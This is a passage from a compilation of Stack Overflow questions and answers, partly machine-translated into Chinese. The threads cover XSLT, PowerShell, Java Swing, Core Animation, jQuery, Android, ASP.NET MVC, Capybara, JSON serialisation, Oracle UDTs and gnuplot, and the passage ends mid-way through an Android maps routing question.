    xmlns:xs="http://www.w3.org/2001/XMLSchema" exclude-result-prefixes="xs">
    <xsl:output omit-xml-declaration="yes" indent="yes"/>

    <xsl:variable name="vNames" as="xs:string+" select=
     "/*/*/line[1]/a/translate(.,' ','')"/>

 <xsl:template match="/*">
   <results>
    <header>
      <xsl:sequence select="/*/*/line[1]/a"/>
    </header>
    <body>
      <xsl:apply-templates select="/*/*/line[position() ne 1]"/>
    </body>
   </results>
 </xsl:template>

 <xsl:template match="line">
  <line>
   <xsl:apply-templates select="a"/>
  </line>
 </xsl:template>

 <xsl:template match="a">
   <xsl:variable name="vPos" select="position()"/>
   <xsl:element name="{$vNames[$vPos]}"><xsl:apply-templates/></xsl:element>
 </xsl:template>
</xsl:stylesheet> 
```

**当此转换应用于提供的 XML 文档时：**

```
<results>
    <body>
        <line>
            <a>Column 1 Customer Name</a>
            <a>Column 2 Customer Add</a>
            <a>Column3</a>
            <a>Column4</a>
        </line>
        <line>
            <a>Data1</a>
            <a>Data2</a>
            <a>Data3</a>
            <a>Data4</a>
        </line>
        <line>
            <a>Data1</a>
            <a>Data2</a>
            <a>Data3</a>
            <a>Data4</a>
        </line>
    </body>
</results> 
```

**产生了想要的正确结果：**

```
<results>
   <header>
      <a>Column 1 Customer Name</a>
      <a>Column 2 Customer Add</a>
      <a>Column3</a>
      <a>Column4</a>
   </header>
   <body>
      <line>
         <Column1CustomerName>Data1</Column1CustomerName>
         <Column2CustomerAdd>Data2</Column2CustomerAdd>
         <Column3>Data3</Column3>
         <Column4>Data4</Column4>
      </line>
      <line>
         <Column1CustomerName>Data1</Column1CustomerName>
         <Column2CustomerAdd>Data2</Column2CustomerAdd>
         <Column3>Data3</Column3>
         <Column4>Data4</Column4>
      </line>
   </body>
</results> 
```

# powershell - piping files to get-content

> ID：13916650
> 
> 赞同：5
> 
> 时间：2012-12-17T15:07:21.413
> 
> 标签：powershell

I'm trying to find a single line of code recursively using powershell.

To look for the line "TODO" in a known file I can do:

```
get-content ActivityLibrary\Accept.cs | select-string TODO 
```

But I don't want to explicitly type every directory\file. I would like to pipe a series of filenames from get-childitem like this:

```
gci -filter *.cs -name -recurse | gc | select-string TODO 
```

But then I see this error:

> Get-Content : The input object cannot be bound to any parameters for the comman d either because the command does not take pipeline input or the input and its properties do not match any of the parameters that take pipeline input. At line:1 char:37

What am I doing wrong?

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-17T15:12:25.993

您需要删除 -Name 开关。它只输出文件名，而不是文件对象。您还可以直接通过管道连接到 Select-String 并删除“gc”。

# java - Add a JButton inside a JTabbedPane tab

> ID：13916651
> 
> 赞同：2
> 
> 时间：2012-12-17T15:07:28.043
> 
> 标签：java, swing, jtabbedpane

> **Possible Duplicate:**
> [Adding a button component to a java tabbed pane in java](https://stackoverflow.com/questions/13901609/adding-a-button-component-to-a-java-tabbed-pane-in-java)

Is it possible to add a button to a JTabbedPane tab (the tab itself) so that when clicked it could perform an action, for example close the tab?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T15:14:18.237

当然。首先添加一个这样的选项卡：

```
JTabbedPane tabbedPane = new JTabbedPane();
tabbedPane.add( "title", content ); 
```

然后用这个改变“标题”标签：

```
tabbedPane.setTabComponentAt( 0, new JButton( "This is now a button!" ) );
// 0 is the tabindex 
```

# macos - How to force redraw of a CALayer during an animation that changes its bounds

> ID：13916657
> 
> 赞同：1
> 
> 时间：2012-12-17T15:07:43.783
> 
> 标签：macos, cocoa, core-animation

I have a layer-hosting NSView. Within that I have a CALayer which includes a drawInContext method. The needsDisplayOnBoundsChange parameter is set to true, and and if I resize the view then the layer is indeed resized and redrawn during correctly during the animation.

However, I'd like to animate the size of the layer independently of the view. I can set up an animation to do this, however the layer isn't redrawn during the animation. Rather, is seems that a snap shot is taken for the start and end frames and one is faded out as the other is faded in. Worse, both images are distorted into the resizing-frame as the animation progresses.

How can I force the CALayer to redraw itself during the resize animation?

Thanks,

Tim

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-25T14:07:49.507

这可能太旧了，但解决方案不应该太难。我不知道是否有更好的方法，但您可以使用 a`CADisplayLink`将您的图层设置为需要重绘。

```
- (void)updateContinuously
{
    if(!self.displayLink) {
        self.displayLink = [CADisplayLink displayLinkWithTarget:self selector:@selector(updateLayer)];
        [self.displayLink addToRunLoop:[NSRunLoop mainRunLoop] forMode:NSRunLoopCommonModes];
    }
}

- (void)stopUpdatingContinuously
{
    [self.displayLink invalidate];
    self.displayLink = nil;
}

- (void)update
{
    // This will fire every time when the display is redrawn
    [self setNeedsDisplay];
}

- (void)updateContinuouslyForTime:(NSTimeInterval)seconds
{
    // Create an NSTimer that will remove the displayLink when the time is over
    NSTimer *stopTimer = [NSTimer scheduledTimerWithTimeInterval:seconds target:self selector:@selector(stopUpdatingContinuously) userInfo:nil repeats:NO];
    [[NSRunLoop mainRunLoop] addTimer:stopTimer forMode:NSRunLoopCommonModes];
} 
```

# javascript - 获取jquery中具有相同名称属性的所有文本框的值

> ID：13916661
> 
> 赞同：12
> 
> 时间：2012-12-17T15:08:07.850
> 
> 标签：javascript, jquery

我需要使用 jquery 获取具有相同名称属性的所有文本框的值。

```
<input type="text" id="text1" name="text[]">
<input type="text" id="text2" name="text[]">
<input type="text" id="text3" name="text[]"> 
```

如何获取文本框**text[]**的所有值并使用 jquery 进行比较。

我尝试使用

```
 var values = $("input[name='text[]']")
 .map(function(){return $(this).val();}).get(); 
```

但我没有成功。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-12-17T15:10:20.847

您可以使用`map`方法并将值存储到数组中。

```
$(function(){
   var values = $('input[name="text[]"]').map(function(){
       return this.value
   }).get()
}) 
```

[http://jsfiddle.net/UugWW/](http://jsfiddle.net/UugWW/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-17T15:09:58.863

这个应该工作：

```
$('input[name="text[]"]'); 
```

您可以循环它以获取所有值。

```
$('input[name="text[]"]').each(function() {
    alert($(this).val());
}); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-17T15:14:34.740

让我们将需求分解为更小的问题。

首先，您要选择所有这些输入。

```
var $inputs = $("input[name='text[]']") 
```

它返回一个 jQuery 对象，包含所有名为`text[]`. 您也可能不需要在名称中使用方括号。

```
var inputs = $inputs.get(); 
```

将匹配的元素提取到一个普通的 Array 中，以便我们现在可以访问 Array 的原型方法，例如[Array.prototype.map](https://developer.mozilla.org/it/docs/Web/JavaScript/Reference/Global_Objects/Array/map)。

```
var values = inputs.map(function takeValue(input) {
    return input.value;
}); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-17T15:10:35.860

使用这样的选择器：

```
$('input[type="text"][name="text[]"') 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-05-28T12:49:51.043

```
var textboxcount = document.getElementsByName("text").length;
var textvalue="";
for (var i = 0; i < textboxcount ; i++) {
 textvalue= textvalue + document.getElementsByName("text").item(i).value; 
}
alert(textvalue); 
```

# flash - 如何在 Flash/Actionscript 中缩放对象以使对象不会移动到中间？

> ID：13916666
> 
> 赞同：1
> 
> 时间：2012-12-17T15:08:26.587
> 
> 标签：flash, actionscript

我是菜鸟，在玩 Flash，并试图在 Actionscript1 中挤压一个对象，改变 _xscale 或 _width。但出乎意料的是，虽然 _x 坐标设置为常数，但图像却发生了偏移：

![](../Images/b32687aeca2668d8cfe7ff429b2496d0.png)

这里灰色的云代表比例之前的对象，白色的云代表比例之后的对象。

我的问题是为什么会发生这种情况以及如何将对象粘贴到某个点，以便在缩放时保持连接到它（例如，我希望固定左上角或右上角的位置）？

更新：我对转换如何工作的看法是否正确：

更改_xscale 不会减小大小，分配给图像并且不会将图像捕捉到它的_x，_y，而是将调整大小的图像保持在初始图像中心的中心？

![在此处输入图像描述](../Images/2171054c6887d48cb119ace8197afa7e.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-18T19:58:26.930

Use transformation matrix, so you want a scale and then a translate. So with transformation matrix you resolve then in the inverse, so you would translate then scale.

If you want you have the left side of your smaller cloud to be at the exact same position as the old could. Move it to the left for 1/4 of the original could's width. Then scale it by 1/2 and it should give you what you want.

# java - 尝试保存 EditText 时无法暂停

> ID：13916667
> 
> 赞同：0
> 
> 时间：2012-12-17T15:08:27.870
> 
> 标签：java, android, nullpointerexception, state

嗨 Stack 的人......我正在尝试让我的应用程序使用该框保存文本，以便当用户关闭应用程序并重新打开它时，输入字段保持保存，但是单击时`EditText`我得到一个`NPE`我的按钮。

请帮助我:)

```
package com.smarte.smartipcontrol;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.Menu;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;

public class IPEntry extends Activity {
    public final static String ACTUALSMARTIP = "com.smarte.smartipcontrol.ACTU_IP";
    private EditText editText;
    private EditText editText2;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.act_ipentry);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.act_ipentry, menu);
        return true;
    }

    /** Called when the user clicks the SendIP button */
    public void sendip(View view) {
        Intent intent = new Intent(this, IPControl.class);
        EditText editText = (EditText) findViewById(R.id.serverIpAddress);
        String actu_ip = editText.getText().toString();
        intent.putExtra(ACTUALSMARTIP, actu_ip);
        startActivity(intent);
    }

    protected void onResume() {
        super.onResume();
        SharedPreferences prefs = getPreferences(0); 
        String restoredText = prefs.getString("text", null);
        if (restoredText != null) {
            editText.setText(restoredText, TextView.BufferType.EDITABLE);

            int selectionStart = prefs.getInt("selection-start", -1);
            int selectionEnd = prefs.getInt("selection-end", -1);
            if (selectionStart != -1 && selectionEnd != -1) {
                editText.setSelection(selectionStart, selectionEnd);
            }
            SharedPreferences prefs2 = getPreferences(1); 
            String restoredText2 = prefs2.getString("text2", null);
            if (restoredText2 != null) {
                editText2.setText(restoredText2, TextView.BufferType.EDITABLE);

                int selectionStart2 = prefs2.getInt("selection-start2", -1);
                int selectionEnd2 = prefs2.getInt("selection-end2", -1);
                if (selectionStart2 != -1 && selectionEnd2 != -1) {
                    editText2.setSelection(selectionStart2, selectionEnd2);
                }
            }
        }
    }

    protected void onPause() {
        super.onPause();

        SharedPreferences.Editor editor = getPreferences(0).edit();
        editor.putString("text", editText.getText().toString());
        editor.putInt("selection-start", editText.getSelectionStart());
        editor.putInt("selection-end", editText.getSelectionEnd());
        editor.commit();

        SharedPreferences.Editor editor2 = getPreferences(1).edit();
        editor2.putString("text2", editText2.getText().toString());
        editor2.putInt("selection-start2", editText2.getSelectionStart());
        editor2.putInt("selection-end2", editText2.getSelectionEnd());
        editor2.commit();
    }   
} 
```

日志猫

```
12-17 13:20:20.043: E/AndroidRuntime(1069): FATAL EXCEPTION: main
12-17 13:20:20.043: E/AndroidRuntime(1069): java.lang.RuntimeException: Unable to pause activity {com.smarte.smartipcontrol/com.smarte.smartipcontrol.IPEntry}: java.lang.NullPointerException
12-17 13:20:20.043: E/AndroidRuntime(1069):     at android.app.ActivityThread.performPauseActivity(ActivityThread.java:3016)
12-17 13:20:20.043: E/AndroidRuntime(1069):     at android.app.ActivityThread.performPauseActivity(ActivityThread.java:2971)
12-17 13:20:20.043: E/AndroidRuntime(1069):     at android.app.ActivityThread.handlePauseActivity(ActivityThread.java:2949)
12-17 13:20:20.043: E/AndroidRuntime(1069):     at android.app.ActivityThread.access$800(ActivityThread.java:141)
12-17 13:20:20.043: E/AndroidRuntime(1069):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1245)
12-17 13:20:20.043: E/AndroidRuntime(1069):     at android.os.Handler.dispatchMessage(Handler.java:99)
12-17 13:20:20.043: E/AndroidRuntime(1069):     at android.os.Looper.loop(Looper.java:137)
12-17 13:20:20.043: E/AndroidRuntime(1069):     at android.app.ActivityThread.main(ActivityThread.java:5039)
12-17 13:20:20.043: E/AndroidRuntime(1069):     at java.lang.reflect.Method.invokeNative(Native Method)
12-17 13:20:20.043: E/AndroidRuntime(1069):     at java.lang.reflect.Method.invoke(Method.java:511)
12-17 13:20:20.043: E/AndroidRuntime(1069):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)
12-17 13:20:20.043: E/AndroidRuntime(1069):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:560)
12-17 13:20:20.043: E/AndroidRuntime(1069):     at dalvik.system.NativeStart.main(Native Method)
12-17 13:20:20.043: E/AndroidRuntime(1069): Caused by: java.lang.NullPointerException
12-17 13:20:20.043: E/AndroidRuntime(1069):     at com.smarte.smartipcontrol.IPEntry.onPause(IPEntry.java:72)
12-17 13:20:20.043: E/AndroidRuntime(1069):     at android.app.Activity.performPause(Activity.java:5206)
12-17 13:20:20.043: E/AndroidRuntime(1069):     at android.app.Instrumentation.callActivityOnPause(Instrumentation.java:1226)
12-17 13:20:20.043: E/AndroidRuntime(1069):     at android.app.ActivityThread.performPauseActivity(ActivityThread.java:3002)
12-17 13:20:20.043: E/AndroidRuntime(1069):     ... 12 more 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T15:22:03.573

我从来没有看到你实例化`editText2`，一旦你检查第 72 行，你可能会得到确认：（`at com.smarte.smartipcontrol.IPEntry.onPause(IPEntry.java:72)`也可以`editText`，请参阅我的编辑）。

由于`editText`and `editText2`（顺便说一下，名称选择不佳）是全局变量，因此您应该在 中实例化它们`onCreate()`：

```
editText = (EditText) findViewById(R.id.serverIpAddress);
editText2 = (EditText) findViewById(R.id.theSecondEditText); 
```

**编辑**：顺便说一句，`sendIp`你正在实例化一个**局部**变量`editText`，这意味着不仅`editText2`是`null`，`editText`也是`null`！您***永远不***应该同时拥有同名的全局变量和局部变量（构造函数除外，然后使用`this`关键字）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-17T15:12:41.837

我怀疑问题是您从未实例化`editText2`，因此当您尝试调用`getText()`它以检索要存储的值时它为空。

在一个不相关的注释上：`editText`并且`editText2`对于变量名来说真的是非常糟糕的选择。您应该始终努力使您的变量名称具有足够的描述性，以便您可以知道它们是什么而无需四处寻找。也许您应该考虑`ipEntryTxt`其中之一？

**编辑：**还请注意，您可能应该移动这一行：

```
EditText editText = (EditText) findViewById(R.id.serverIpAddress); 
```

在 onCreate() 内部而不是在内部`sendip()`因为您的代码现在是如果用户打开此活动但从未按下按钮（调用 sendip()），那么`editText`在 onPause() 触发时将为空，这将为您提供空指针异常也。

# asp.net-mvc - pdf查看器的MVC控件不一致

> ID：13916668
> 
> 赞同：0
> 
> 时间：2012-12-17T15:08:32.880
> 
> 标签：asp.net-mvc, asp.net-mvc-4

```
<object id='pdfbox' style="width:900px; height:800px;" type="application/pdf" 
    data="@Url.Action("Action", "Controller", new { sID = this.Model.sID })">
</object> 
```

此控件用于在视图中显示 pdf 文件。

此控件在某些系统中工作正常，但在构建和其他一些机器中，它不起作用。是否需要安装一些东西？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-29T22:40:12.567

经过一番搜索，我发现了这个：

您可以将 PDF 嵌入到局部视图中，然后通过 ajax 使用表单提交按钮上的 PDF 更新局部视图。

```
@model Test.Models.ViewModel

<style type="text/css">

#pdfbox
{
    width:600px;
    height:400px;
    border: 5px solid #ccc;
}

</style>

<object id='pdfbox' type="application/pdf" data="@Url.Action("GeneratePDF", "Home", Model)">
    Click @Html.ActionLink("here", "GeneratePDF", "Home") to view the file.
</object> 
```

//控制器

```
public ActionResult GeneratePDF(ViewModel model)
    {

        byte[] bytes = OpenPDFAndGetBytes("Thepdfname");
        return File(bytes, "application/pdf");
    }

    public ActionResult RenderPDF(LabelViewModel model)
    {
        return PartialView(model);
    }

//main view

@using (Ajax.BeginForm("RenderPDF", "Home", new AjaxOptions { UpdateTargetId = "pdf" }))
{
    <table>
        <tr>
            <td>
                <fieldset>
                    <legend>Fill the form:</legend>
                        Some form junk can go here
                    <br />
                    <input type="submit" value="Display PDF" />
                </fieldset>
            </td>
            <td>
                <div id='pdf'>
                    @{
                        Html.RenderPartial("RenderPDF", Model);
                    }
                </div>
            </td>
        </tr>
    </table>
} 
```

[来源](https://stackoverflow.com/questions/13721529/pdf-viewer-in-mvc-to-show-the-pdf-contents-in-view)

# html - 如何在 capybara 中发送_keys 向下箭头

> ID：13916671
> 
> 赞同：9
> 
> 时间：2012-12-17T15:08:39.010
> 
> 标签：html, ruby, selenium, cucumber, capybara

我有一个特殊的列表框，我可以通过发送向下箭头并按 Enter 来实现最佳自动化。

我可以像这样按回车：

```
listbox_example = find(input, "listbox-example")
listbox-example.set("stuff")
#down arrow command goes here
listbox-example.native.send_keys :return 
```

如何编写向下箭头命令？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-17T15:34:47.667

如果我没记错的话，发送向下箭头命令的正确方法是使用 arrow_down

所以你的代码应该是这样的

```
listbox-example.native.sendkeys :arrow_down 
```

如果您想要一份可以发送的所有可用密钥的列表，那么文档是您的朋友

[http://www.ruby-doc.org/gems/docs/f/frameworks-capybara-0.2.18/SendKeys.html](http://www.ruby-doc.org/gems/docs/f/frameworks-capybara-0.2.18/SendKeys.html)

编辑：这个链接可能有预期的内容。 [https://www.omniref.com/ruby/gems/frameworks-capybara/0.2.18/symbols/SendKeys](https://www.omniref.com/ruby/gems/frameworks-capybara/0.2.18/symbols/SendKeys)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2019-08-10T17:11:53.373

```
find('#element_id').send_keys :arrow_down 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2021-02-16T17:02:05.793

这些答案取决于我相信的驱动程序。我正在使用 Apparition js 驱动程序（即，它是 capybara 的插件），并且有效的魔法代码是这样的：

```
find("input[type='search']").send_keys(:down).send_keys(:enter) 
```

使用水豚 3.33.0

使用[Apparition JS 驱动程序（水豚插件）](https://github.com/twalpole/apparition)版本 0.6.0

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2016-12-23T16:22:58.670

这些天（Capybara 2.5+ 版）您可以`<enter>`通过以下方式模拟密钥：

```
find('.selector').set("text\n") 
```

这里`\n`是关键。我认为您应该能够以非常相似的方式模拟向下箭头。

# javascript - JSON.stringify 向我的 Json 对象添加额外的 \ 和 "" 的问题

> ID：13916673
> 
> 赞同：37
> 
> 时间：2012-12-17T15:08:57.933
> 
> 标签：javascript, arrays, json, serialization, deserialization

嗨，我正在使用 Javascript 创建一个对象数组，其中包含一个键和一个值，使用以下代码。

```
ValuesArray.push({ key: $(this).attr('someattribute'), value: $(this).val() }); 
```

结果，我有这样的对象数组：

```
key:29; value: 'Country'
Key:12; value: '4,3,5' 
```

当我尝试对其进行字符串化并在帖子中发送该 JSON 时，我在不想要的地方使用了带有 \ 和“ . 如何使用 stringify 创建一个干净的 JSON

```
var jObject = JSON.stringify(ValuesArray); 
```

我现在错误的 JSON 是：

```
{
  "JObject": "[{\"key\":\"29\",\"value\":\"Country\"},  {\"key\":\"30\",\"value\":\"4,3,5\"}]"
} 
```

我想要一个像这样的 JSON 对象

```
{
  "JObject": [{"key":"29","value":"Country"},{"key":"30","value":"4,3,5"}]
} 
```

没有引号`[]`和字符`\`

任何解决它的好主意。

谢谢

更详细地了解我如何将 JSON 发送到我的 API 这是我将 JSON 发送到我的 Web API 的方式：

```
function PostAPIRequest(address) {

           var jObject = JSON.stringify(ValuesArray);

           var responseJson = null;
           $.ajax({
               url: address,
               type: 'POST',
               dataType: 'json',
               data: { JObject: jObject },
               success: function (data) {
                   responseJson = data
                   ProcessDataResponse(responseJson);
                   //TODO: REFRESH THE DATA GRID
               },
               error: function (xhr, ajaxOptions, thrownError) {
                   //TODO redirect to the error page and send error email there.
                   alert(xhr.status);
                   alert(thrownError);
               }
           })
       } 
```

这就是我在我的 API 控制器中接收它的方式

```
...
  // POST api/datavalues/5

   public string Post(int id, JObject  value)
    {
        var temp = value;

... 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-12-17T15:12:33.297

看起来您正在将字符串作为地图中的值。您应该执行以下操作：

`var objMap = {"JObject" : ValuesArray};` `var json = JSON.stringify(objMap)`

发生的事情是您对值数组进行双重 json 编码 - 请注意，您的“无效”JSON 值实际上是 JSON 字符串，而不是您想要的数组。

**编辑** 看起来你正在将地图的 JSON 字符串粘贴到一个数组中，然后对其进行字符串化。这是一个 jsfiddle，应该可以帮助您获得所需的内容 - [http://jsfiddle.net/4G5nF/](http://jsfiddle.net/4G5nF/)

在您的帖子请求中，试试这个

```
var jObject = {"JObject" : ValuesArray};
$.ajax({   url: address,
           type: 'POST',
           dataType: 'json',
           data: jObject,
           success: function (data)  { .. }}); 
```

注意数据属性的变化。这是一个自动为您 JSON 化的值。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2017-10-25T03:49:13.300

```
const config = {a: 1, b: 2}
console.log(JSON.stringify(JSON.stringify(config))) 
```

**"{\"a\": 1, \"b\": 2}"**

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2013-12-02T15:20:38.547

可能是你有一个旧`prototype`图书馆。当我删除它时，错误消失了

# oracle - Oracle UDT 类型不匹配

> ID：13916676
> 
> 赞同：1
> 
> 时间：2012-12-17T15:09:05.060
> 
> 标签：oracle, odp.net, user-defined-types, type-mismatch

我们有一个项目，它有两个使用相同 UDT 的模块。我们已经生成了示例代码中显示的 UDT。当我们的项目调用 B 的 SP 应该从 B.DbObjects 命名空间返回 UDT 时，返回的类型是 A.DbObjects 命名空间。这是因为 Oracle Data Access 从 OracleCustomTypeMappingAttribute 获取类型名称并使用该值创建实例。由于命名空间不同，我们无法将数据绑定到我们的返回类型。有解决方案吗？

代码：

模块 A - 输出 A.dll

```
namespace A.DbObjects
{
    [OracleCustomTypeMapping("SCHEMA.UDTNAME")]
    public partial class UDTNAME : OracleCustomType
    {
        [OracleObjectMappingAttribute("X")]
        public string X { get; set; }
        [OracleObjectMappingAttribute("Y")]
        public decimal Y { get; set; }
        [OracleObjectMappingAttribute("Z")]
        public decimal Z { get; set; }
    }
} 
```

模块 B - 输出 B.dll

```
namespace B.DbObjects
{
    [OracleCustomTypeMapping("SCHEMA.UDTNAME")]
    public partial class UDTNAME : OracleCustomType
    {
        [OracleObjectMappingAttribute("X")]
        public string X { get; set; }
        [OracleObjectMappingAttribute("Y")]
        public decimal Y { get; set; }
        [OracleObjectMappingAttribute("Z")]
        public decimal Z { get; set; }
    }
} 
```

# performance - 日志记录和性能分析

> ID：13916677
> 
> 赞同：0
> 
> 时间：2012-12-17T15:09:08.350
> 
> 标签：performance, logging

当我为应用程序启用日志记录时，同时对应用程序进行性能测量，那么日志记录会大大降低某些系统的性能。有什么办法可以防止这种情况吗？这样日志记录就不会影响性能。

# plot - 在 gnuplot 平滑中包含数据点

> ID：13916678
> 
> 赞同：4
> 
> 时间：2012-12-17T15:09:11.057
> 
> 标签：plot, gnuplot, smooth

数据如下：

```
38 52.26
41 46.34
42 49.49 
```

使用`smooth`线条；我可以在图形线上包含点而不绘制两次吗？

现在我使用：

```
plot "foo.dat" using ($0):2 smooth csplines title "foo", \
               '' using ($0):2 with points title "" 
```

![示例图](../Images/5c6709842a2b1bfaf3b1205cc5457faa.png)

扩展简化数据集：

```
38     52.26
39     46.34
42     57.29
43     60.41
44     53.57
45     51.49
46     48.24
49     58.50
50     56.85
51     55.56
52     62.81
54     51.76
55     46.94
56     46.35
57     52.76
59     49.49
62     51.78
63     48.24
65     54.46
66     50.00 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-10-30T20:32:28.353

这是我的做法：

```
...
plot "file" using 1:3 notitle with points linestyle 1, \
     "" using 1:3 notitle smooth csplines with lines linestyle 1, \
     1 / 0 title "title" with linespoints linestyle 1
... 
```

![在此处输入图像描述](../Images/e7f4450c60fca2387831bc9e4c2e0b3b.png)

第一个条目在图表上绘制点，没有图例。第二个条目在图表上绘制平滑线，同样没有图例。第三个条目仅用于图例，使用组合的线点。

如果您在平滑线上使用linespoints，它将显示使其平滑的所有点，而不仅仅是数据点。

'linestyle' 告诉 gnuplot 使用相同的样式绘制所有数据，基本上将线和点合成为线点。第三行，“linespoints”，仅用于图例，并没有在图上放置任何数据。

# android - Google Maps Android V2 和 Direction API

> ID：13916679
> 
> 赞同：9
> 
> 时间：2012-12-17T15:09:13.353
> 
> 标签：android, google-maps-mobile, google-maps-android-api-2

我正在开发一个应用程序，我需要知道当前用户位置和兴趣点之间的路径。

我正在使用 android 2.3.3、google maps android v2 和 direction api。我的问题是我找到的所有代码都是针对旧版地图的，我也尝试调整代码但失败了。我尝试在 LatLng 中更改 GeoPoint（此新版本不支持）。问题是我无法显示路径，为此我创建了一条新的折线并将其添加到地图中。

我发布我的代码：

解析器：

```
public interface Parser {
    public Route parse();
} 
```

XML解析器

```
public class XMLParser {
    // names of the XML tags
    protected static final String MARKERS = "markers";
    protected static final String MARKER = "marker";

    protected URL feedUrl;

    protected XMLParser(final String feedUrl) {
            try {
                    this.feedUrl = new URL(feedUrl);
            } catch (MalformedURLException e) {
                    Log.e(e.getMessage(), "XML parser - " + feedUrl);
            }
    }

    protected InputStream getInputStream() {
            try {
                    return feedUrl.openConnection().getInputStream();
            } catch (IOException e) {
                    Log.e(e.getMessage(), "XML parser - " + feedUrl);
                    return null;
            }
    }
} 
```

JsonParser（解析google方向json）

```
public class JsonParser extends XMLParser implements Parser {
    /** Distance covered. **/
    private int distance;

    public JsonParser(String feedUrl) {
        super(feedUrl);
    }

    /**
     * Parses a url pointing to a Google JSON object to a Route object.
     * @return a Route object based on the JSON object.
     */

    public Route parse() {
        // turn the stream into a string
        final String result = convertStreamToString(this.getInputStream());
        //Create an empty route
        final Route route = new Route();
        //Create an empty segment
        final Segment segment = new Segment();
        try {
            //Tranform the string into a json object
            final JSONObject json = new JSONObject(result);
            //Get the route object
            final JSONObject jsonRoute = json.getJSONArray("routes").getJSONObject(0);
            //Get the leg, only one leg as we don't support waypoints
            final JSONObject leg = jsonRoute.getJSONArray("legs").getJSONObject(0);
            //Get the steps for this leg
            final JSONArray steps = leg.getJSONArray("steps");
            //Number of steps for use in for loop
            final int numSteps = steps.length();
            //Set the name of this route using the start & end addresses
            route.setName(leg.getString("start_address") + " to " + leg.getString("end_address"));
            //Get google's copyright notice (tos requirement)
            route.setCopyright(jsonRoute.getString("copyrights"));
            //Get the total length of the route.
            route.setLength(leg.getJSONObject("distance").getInt("value"));
            //Get any warnings provided (tos requirement)
            if (!jsonRoute.getJSONArray("warnings").isNull(0)) {
                route.setWarning(jsonRoute.getJSONArray("warnings").getString(0));
            }
            /* Loop through the steps, creating a segment for each one and
             * decoding any polylines found as we go to add to the route object's
             * map array. Using an explicit for loop because it is faster!
             */
            for (int i = 0; i < numSteps; i++) {
                //Get the individual step
                final JSONObject step = steps.getJSONObject(i);
                //Get the start position for this step and set it on the segment
                final JSONObject start = step.getJSONObject("start_location");
                final LatLng position = new LatLng(start.getDouble("lat"), start.getDouble("lng"));
                segment.setPoint(position);
                //Set the length of this segment in metres
                final int length = step.getJSONObject("distance").getInt("value");
                distance += length;
                segment.setLength(length);
                segment.setDistance(distance/1000);
                //Strip html from google directions and set as turn instruction
                segment.setInstruction(step.getString("html_instructions").replaceAll("<(.*?)*>", ""));
                //Retrieve & decode this segment's polyline and add it to the route.
                route.addPoints(decodePolyLine(step.getJSONObject("polyline").getString("points")));
                //Push a copy of the segment to the route
                route.addSegment(segment.copy());
            }
        } catch (JSONException e) {
            Log.e(e.getMessage(), "Google JSON Parser - " + feedUrl);
        }
        return route;
    }

    /**
     * Convert an inputstream to a string.
     * @param input inputstream to convert.
     * @return a String of the inputstream.
     */

    private static String convertStreamToString(final InputStream input) {
        final BufferedReader reader = new BufferedReader(new InputStreamReader(input));
        final StringBuilder sBuf = new StringBuilder();

        String line = null;
        try {
            while ((line = reader.readLine()) != null) {
                sBuf.append(line);
            }
        } catch (IOException e) {
            Log.e(e.getMessage(), "Google parser, stream2string");
        } finally {
            try {
                input.close();
            } catch (IOException e) {
                Log.e(e.getMessage(), "Google parser, stream2string");
            }
        }
        return sBuf.toString();
    }

    /**
     * Decode a polyline string into a list of LatLng.
     * @param poly polyline encoded string to decode.
     * @return the list of GeoPoints represented by this polystring.
     */

    private List<LatLng> decodePolyLine(final String poly) {
        int len = poly.length();
        int index = 0;
        List<LatLng> decoded = new LinkedList<LatLng>();
        int lat = 0;
        int lng = 0;

        while (index < len) {
            int b;
            int shift = 0;
            int result = 0;
            do {
                b = poly.charAt(index++) - 63;
                result |= (b & 0x1f) << shift;
                shift += 5;
            } while (b >= 0x20);
            int dlat = ((result & 1) != 0 ? ~(result >> 1) : (result >> 1));
            lat += dlat;

            shift = 0;
            result = 0;
            do {
                b = poly.charAt(index++) - 63;
                result |= (b & 0x1f) << shift;
                shift += 5;
            } while (b >= 0x20);
            int dlng = ((result & 1) != 0 ? ~(result >> 1) : (result >> 1));
            lng += dlng;

            decoded.add(new LatLng((lat / 1E5),(lng / 1E5)));
        }

        return decoded;
    }
} 
```

路线（保存 json 信息）

```
public class Route {
    private String name;
    private final List<LatLng> points;
    private List<Segment> segments;
    private String copyright;
    private String warning;
    private String country;
    private int length;
    private String polyline;

    public Route() {
        points = new LinkedList<LatLng>();
        segments = new LinkedList<Segment>();
    }

    public void addPoint(final LatLng p) {
        points.add(p);
    }

    public void addPoints(final List<LatLng> points) {
        this.points.addAll(points);
    }

    public List<LatLng> getPoints() {
        return points;
    }

    public void addSegment(final Segment s) {
        segments.add(s);
    }

    public List<Segment> getSegments() {
        return segments;
    }

    /**
     * @param name the name to set
     */
     public void setName(final String name) {
        this.name = name;
    }

    /**
     * @return the name
     */
